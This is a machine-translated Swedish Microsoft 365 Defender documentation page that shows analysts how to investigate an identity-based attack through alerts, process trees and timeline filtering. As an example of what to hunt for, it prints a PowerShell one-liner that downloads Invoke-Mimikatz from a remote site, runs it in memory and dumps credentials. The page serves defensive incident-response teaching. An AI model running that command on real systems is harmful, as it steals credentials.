---
title: Exempel på en identitetsbaserad attack
description: Gå igenom en exempelanalys av en identitetsbaserad attack.
keywords: incidenter, varningar, undersöker, korrelation, attack, datorer, enheter, användare, identiteter, identiteter, postlåda, e-post, 365, microsoft, m365, incidentsvar, cyberattack
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: c028289a58247075c33e85d6d6f3797b3ddad7b4
ms.sourcegitcommit: de5fce90de22ba588e75e1a1d2e87e03b9e25ec7
ms.translationtype: MT
ms.contentlocale: sv-SE
ms.lasthandoff: 05/10/2021
ms.locfileid: "52297194"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="d42cb-104">Exempel på en identitetsbaserad attack</span><span class="sxs-lookup"><span data-stu-id="d42cb-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="d42cb-105">**Gäller för:**</span><span class="sxs-lookup"><span data-stu-id="d42cb-105">**Applies to:**</span></span>
- <span data-ttu-id="d42cb-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="d42cb-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="d42cb-107">Microsoft Defender för identitet kan hjälpa till att identifiera skadliga försök att avslöja identiteter i organisationen.</span><span class="sxs-lookup"><span data-stu-id="d42cb-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="d42cb-108">Eftersom Defender för identitet integreras med Microsoft 365 Defender kan säkerhetsanalytiker se hot som kommer in från Defender för identitet, till exempel misstänkta Netlogon-behörighetsförsök.</span><span class="sxs-lookup"><span data-stu-id="d42cb-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="d42cb-109">Analysera attacken i Microsoft Defender för identitet</span><span class="sxs-lookup"><span data-stu-id="d42cb-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="d42cb-110">Microsoft 365 Med Defender kan analytiker filtrera aviseringar efter identifieringskälla **på fliken** Aviseringar på sidan Incidenter.</span><span class="sxs-lookup"><span data-stu-id="d42cb-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="d42cb-111">I följande exempel filtreras identifieringskällan till **Defender för identitet.**</span><span class="sxs-lookup"><span data-stu-id="d42cb-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Exempel på filtrering av identifieringskällan för Defender för identitet":::

<span data-ttu-id="d42cb-113">Om du **väljer den misstänkta overpass-the-hash-attackvarningen** går du till en sida i Microsoft Cloud App Security som visar mer detaljerad information.</span><span class="sxs-lookup"><span data-stu-id="d42cb-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="d42cb-114">Du kan alltid ta reda på mer  om en avisering eller [](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) attack genom att välja Läs mer om den här aviseringstypen för att läsa en beskrivning av attacken samt åtgärdsförslag.</span><span class="sxs-lookup"><span data-stu-id="d42cb-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Exempel på misstänkt överpass-hash-attackvarning"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="d42cb-116">Undersöker samma attack i Microsoft Defender för Endpoint</span><span class="sxs-lookup"><span data-stu-id="d42cb-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="d42cb-117">En analytiker kan också använda Defender för Endpoint om du vill veta mer om aktiviteten på en slutpunkt.</span><span class="sxs-lookup"><span data-stu-id="d42cb-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="d42cb-118">Välj incidenten i incidentkön och välj sedan **fliken** Aviseringar. Härifrån kan de även identifiera identifieringskällan.</span><span class="sxs-lookup"><span data-stu-id="d42cb-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="d42cb-119">En identifieringskälla som heter Identifiering och åtgärd på slutpunkt det här kallas slutpunktsidentifiering och -svar, som är Defender för Slutpunkt.</span><span class="sxs-lookup"><span data-stu-id="d42cb-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="d42cb-120">Härifrån väljer analytikern en avisering som identifieras av Identifiering och åtgärd på slutpunkt.</span><span class="sxs-lookup"><span data-stu-id="d42cb-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Exempel på identifiering och svar av slutpunkt i Defender för slutpunkt"::: 

<span data-ttu-id="d42cb-122">På aviseringssidan visas olika relevant information, till exempel den påverkade enhetens namn, användarnamn, status för automatisk undersökning och aviseringsinformationen.</span><span class="sxs-lookup"><span data-stu-id="d42cb-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="d42cb-123">I varningsartikeln visas en visuell representation av processträdet.</span><span class="sxs-lookup"><span data-stu-id="d42cb-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="d42cb-124">Processträdet är en hierarkisk representation av överordnade och underordnade processer som är relaterade till aviseringen.</span><span class="sxs-lookup"><span data-stu-id="d42cb-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Exempel på ett aviseringsprocessträd i Defender för Slutpunkt"::: 

<span data-ttu-id="d42cb-126">Varje process kan utökas för att visa ytterligare information.</span><span class="sxs-lookup"><span data-stu-id="d42cb-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="d42cb-127">Information som en analytiker kan se är de faktiska kommandon som har angetts som en del av ett skadligt skript, utgående anslutnings-IP-adresser och annan användbar information.</span><span class="sxs-lookup"><span data-stu-id="d42cb-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Exempel på processinformation i Defender för Slutpunkt":::
 
<span data-ttu-id="d42cb-129">Genom att **välja Visa på tidslinjen** kan en analytiker granska nedåt ytterligare för att fastställa den exakta tiden för kompromissen.</span><span class="sxs-lookup"><span data-stu-id="d42cb-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="d42cb-130">Microsoft Defender för Endpoint kan identifiera många skadliga filer och skript.</span><span class="sxs-lookup"><span data-stu-id="d42cb-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="d42cb-131">På grund av många legitima användningsområden för utgående anslutningar, PowerShell och kommandoradsaktivitet anses dock en del aktivitet vara aktiv tills den skapar en skadlig fil eller aktivitet.</span><span class="sxs-lookup"><span data-stu-id="d42cb-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="d42cb-132">Därför hjälper användning av tidslinjen analytiker att sätta aviseringen i sitt sammanhang med den omgivande aktiviteten för att fastställa den ursprungliga källan eller tiden för attacken som annars döljs av vanliga filsystem och användaraktivitet.</span><span class="sxs-lookup"><span data-stu-id="d42cb-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="d42cb-133">För att göra detta skulle en analytiker börja vid tiden för aviseringsidentifiering (i rött) och rulla nedåt bakåt i tiden för att avgöra när den ursprungliga aktiviteten som ledde till den skadliga aktiviteten faktiskt startade.</span><span class="sxs-lookup"><span data-stu-id="d42cb-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Exempel på att starta vid tiden för aviseringsidentifiering"::: 

<span data-ttu-id="d42cb-135">Det är viktigt att förstå och urskilja vanlig aktivitet, till exempel Windows Uppdatera anslutningar, Windows Aktiveringstrafik för betrodd programvara, andra vanliga anslutningar till Microsoft-webbplatser, Internetaktivitet från tredje part, Microsoft Endpoint Configuration Manager-aktivitet och annan aktivitet på misstänkta webbplatser.</span><span class="sxs-lookup"><span data-stu-id="d42cb-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="d42cb-136">Ett sätt att uppnå det här är att använda tidslinjefilter.</span><span class="sxs-lookup"><span data-stu-id="d42cb-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="d42cb-137">Det finns många filter som kan markera viss aktivitet när du filtrerar bort något som analytikern inte vill visa.</span><span class="sxs-lookup"><span data-stu-id="d42cb-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="d42cb-138">I bilden nedan har analytikern filtrerats för att endast visa nätverks- och processhändelser.</span><span class="sxs-lookup"><span data-stu-id="d42cb-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="d42cb-139">Då kan analytikern se nätverksanslutningar och processer kring händelsen där Anteckningar upprättat en anslutning med en IP-adress, vilket vi också såg i processträdet.</span><span class="sxs-lookup"><span data-stu-id="d42cb-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Exempel på hur Anteckningar användes för att skapa en skadlig utgående anslutning"::: 

<span data-ttu-id="d42cb-141">I den här händelsen Anteckningar en skadlig utgående anslutning.</span><span class="sxs-lookup"><span data-stu-id="d42cb-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="d42cb-142">Men ofta används bara iexplorer.exe för att upprätta anslutningar för att ladda ned en skadlig nyttolast eftersom iexplorer.exe vanligtvis anses vara vanlig webbläsaraktivitet.</span><span class="sxs-lookup"><span data-stu-id="d42cb-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="d42cb-143">Ett annat objekt att leta efter på tidslinjen skulle vara PowerShell-användningsområden för utgående anslutningar.</span><span class="sxs-lookup"><span data-stu-id="d42cb-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="d42cb-144">Analytikern letar efter lyckade PowerShell-anslutningar med kommandon som följt av en utgående anslutning till `IEX (New-Object Net.Webclient)` en webbplats som är värd för en skadlig fil.</span><span class="sxs-lookup"><span data-stu-id="d42cb-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="d42cb-145">I följande exempel användes PowerShell till att ladda ned och köra Mimikatz från en webbplats:</span><span class="sxs-lookup"><span data-stu-id="d42cb-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="d42cb-146">En analytiker kan snabbt söka efter nyckelord genom att skriva in nyckelordet i sökfältet för att endast visa händelser som skapats med PowerShell.</span><span class="sxs-lookup"><span data-stu-id="d42cb-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="d42cb-147">Nästa steg</span><span class="sxs-lookup"><span data-stu-id="d42cb-147">Next step</span></span>

<span data-ttu-id="d42cb-148">Se sökvägen till nätfiskeundersökningen. [](first-incident-path-phishing.md)</span><span class="sxs-lookup"><span data-stu-id="d42cb-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="d42cb-149">Se även</span><span class="sxs-lookup"><span data-stu-id="d42cb-149">See also</span></span>

- [<span data-ttu-id="d42cb-150">Översikt över incidenter</span><span class="sxs-lookup"><span data-stu-id="d42cb-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="d42cb-151">Hantera incidenter</span><span class="sxs-lookup"><span data-stu-id="d42cb-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="d42cb-152">Undersöka incidenter</span><span class="sxs-lookup"><span data-stu-id="d42cb-152">Investigate incidents</span></span>](investigate-incidents.md)
